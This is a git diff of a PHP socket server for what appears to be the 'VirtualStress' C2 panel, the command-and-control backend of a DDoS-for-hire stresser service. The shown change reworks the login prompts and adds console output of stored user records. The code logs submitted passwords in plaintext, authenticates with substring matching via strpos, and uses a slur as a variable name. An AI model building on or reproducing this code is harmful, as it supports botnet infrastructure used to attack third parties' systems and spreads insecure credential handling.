@@ -54,19 +54,16 @@ while (true)
 
     if ($newsock = @socket_accept($sock))
     {
-        socket_write($newsock, $banner->login_bnnr($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"]), strlen($banner->login_bnnr($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"])));
-        socket_write($newsock, "\033[17;15f", strlen("\033[17;15f"));
-        socket_write($newsock, "\033[8;18;36t", strlen("\033[8;18;36t"));
-        // socket_write($newsock, "Welcome To VirtualStress C2!\r\n", strlen("Welcome To VirtualStress C2!\r\n"));
+        // socket_write($newsock, $banner->login_bnnr($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"]), strlen($banner->login_bnnr($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"])));
+        // socket_write($newsock, "\033[17;15f", strlen("\033[17;15f"));
+        // socket_write($newsock, "\033[8;18;36t", strlen("\033[8;18;36t"));
+        socket_write($newsock, "Welcome To VirtualStress C2!\r\n", strlen("Welcome To VirtualStress C2!\r\n"));
         socket_getpeername($newsock, $client_ip, $client_port);
-        $usrname = alt_getInput($newsock, 3);
-        socket_write($newsock, $config->Colors["Clear"], strlen($config->Colors["Clear"]));
-        socket_write($newsock, $banner->passwd_bnnr($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"]), strlen($banner->passwd_bnnr($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"])));
-        socket_write($newsock, "\033[17;15f", strlen("\033[17;15f"));
-        socket_write($newsock, "\033[8;18;36t", strlen("\033[8;18;36t"));
-        $passwd = alt_getInput($newsock, 3);
+        $usrname = alt_getInput($newsock, "Username: ", 3);
+        $passwd = alt_getInput($newsock, "Password: ", 3);
         echo "# [ NEW LOGIN ATTEMPT ] #\r\n$usrname | $passwd\r\n\r\n";
         $gay = $crud->user($client_ip, "all");
+        echo $gay. "\r\n";
         $user_info = explode(",", $gay);
         if(strpos($usrname, $user_info[0]) !== false && strpos($passwd, $user_info[2]) !== false) {
             if($client_ip == $user_info[1]) {
@@ -156,11 +153,11 @@ while (true)
     // sleep(1);
 }
 
-function alt_getInput($socket, $i) {
+function alt_getInput($socket, $str, $i) {
     $FetchedInput = "";
     $checking_characters = false;
 
-    // socket_write($socket, $str, strlen($str));
+    socket_write($socket, $str, strlen($str));
     sleep($i);
     $sokc = socket_recv($socket, $string, 1024, MSG_DONTWAIT);
     $FetchedInput = $string;
